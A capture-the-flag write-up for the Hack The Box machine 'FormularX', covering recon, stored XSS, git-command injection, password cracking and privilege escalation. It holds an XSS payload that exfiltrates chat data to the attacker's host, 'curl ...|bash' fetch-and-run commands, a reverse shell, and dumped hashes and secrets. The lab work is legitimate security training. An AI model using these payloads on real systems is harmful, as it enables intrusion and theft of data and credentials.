# Write-up FormularX 
**Hackthebox**

## Recon
Using nmap tools: `nmap -sV -A --min-rate 15000 -v $ip -oN /opt/nmap/formularx`
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 496A37014B10519386B2904D1B3086BE
|_http-cors: GET POST
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/12%OT=22%CT=1%CU=38765%PV=Y%DS=2%DC=T%G=Y%TM=65F0
OS:175E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=109%TI=
OS:Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M5
OS:3CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88
OS:%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 46.071 days (since Fri Jan 26 02:07:55 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   279.52 ms 10.10.14.1
2   279.74 ms 10.10.11.6
```

When i analysis this site at port 80, i see it use nodejs, expressjs and auth with jwt.
- Use `gobuster` enumurate file and dir -> see /restricted/chat.js
- From that file you redirect to contact page, you see xxs vul in this
how to know
1. fill firstname and lastname at textarea fill `<img src=x onerror="document.location='http:<yourmachine>:<port>/`"/>`
2. Listen http server, you can use `php -S 0.0.0.0:<port>` or `python -m http.server <port>`
3. click send -> you see in your terminal our server is received the request
=> From chat.js, write the payload get info important from the server.

```shell
┌──(toan㉿kali)-[~]
└─$ cat test.js                         
const script = document.createElement('script');
script.src='/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function() {
const res = axios.get( /user/api/chat");
const socket = io('/',{withCredentials: true});
socket.on('message', (my_message) => {fetch("http://10.10.14.18:8888/?d=" + btoa(my_message))}) ;
socket.emit('client_message', 'history');
});
```
- Encode this payload, `cat test.js | base64`.

- the atob func will decode base64
`{"first_name":"a","last_name":"asdf","message":"<img src=x onerror=\"eval(atob('<payload encode base64>'))\">"}`
![img2](./img/img2.png)
```shell
┌──(toan㉿kali)-[~]
└─$ python -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.6 - - [12/Mar/2024 08:05:48] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:05:52] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:05:55] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:05:59] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:06:02] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:06:06] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:06:09] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:06:13] "GET /shell.js HTTP/1.1" 200 -
10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:30] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:30] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:34] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [12/Mar/2024 08:08:34] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
10.10.11.6 - - [12/Mar/2024 08:08:37] code 501, message Unsupported method ('OPTIONS')
.....
```

=>
```shell
R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=
SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg=
V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=
```
![img1](./img/img1.png)
=> you see subdomain `dev-git-auto-update.chatbot.htb`

- add this domain into `/etc/hosts`.type:  `echo "10.10.11.6 dev-git-auto-update.chatbot.htb"  | sudo tee -a /etc/hosts`. goto that site!
...

This page use `simple-git v3.14`, use can search internet this! It show [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221).
I inject the payload by bash code though this vuls!.
`ext::sh -c curl% http://10.10.14.18:8888/shell.sh|bash`

![img 3](./img/img3.png)

- This project use mongodb, you type `mongo`  -> yah, from this you can interact with db, you can read the project, it is using testing db to save -> `use testing`.
```shell
use testing
switched to db testing
show collections
messages
users
db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAyNDk2ODJ9.GW97zDBRfK4goXJakZ0WgqKBLj_CVpW_ir1mNXnp1-4", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
``` 

The frank_dorky's password is encode, this is `bcrypt`. JohnTheRipper or hashcat to decode it.
![img4](./img/img4.png) 

```shell
┌──(toan㉿kali)-[~]
└─$ nano hash  
                                                                             
┌──(toan㉿kali)-[~]
└─$ cat hash
$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
┌──(toan㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:14 DONE (2024-03-12 09:29) 0.06934g/s 194.7p/s 194.7c/s 194.7C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                    
```
`manchesterunited`
![img 5](./img/img5.png)
```shell
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Mar  5 10:19:47 2024 from 10.10.14.23
frank_dorky@formulax:~$ ls
user.txt                                      
frank_dorky@formulax:~$ cat user.txt          
c734e98<************>47e0a07              
frank_dorky@formulax:~$                                                      
```

- Using `ss -tl` you see port 3000, this port can run the service vuln!. Using ssh reserve forwarding port `ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6`. Goto this website.
- enable console log in broswer, you see error. `echo "127.0.0.1 librenms.com" | sudo tee -a /etc/hosts` -> fix done!.  search internet you can see ![payload](https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/?utm_content=security&utm_medium=social&utm_source=twitter)

```shell
@php
    system('curl http:<host>/shell.sh | bash >&2');
@endphp


-└─$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.6] 48006
bash: cannot set terminal process group (937): Inappropriate ioctl for device
bash: no job control in this shell
librenms@formulax:~$ env
env
DB_PASSWORD=mychemicalformulaX
PWD=/opt/librenms
NODE_ID=648b260eb18d2
HOME=/opt/librenms
APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
DB_USERNAME=kai_relay
DB_HOST=localhost
USER=librenms
SHLVL=3
VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
DB_DATABASE=librenms
VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
_=/usr/bin/env
librenms@formulax:~$ 

```
=> kai_replay = `mychemicalformulaX`
- you see when run `sudo -l` -> office.sh, it call calc office though port 2002 exploit this

github link: ![link exploit](https://github.com/sud0woodo/ApacheUNO-RCE/blob/master/uno-rce.py) 

Image you can need!
![img6](./img/img6.png)
![img7](./img/img7.png)
![img8](./img/img8.png)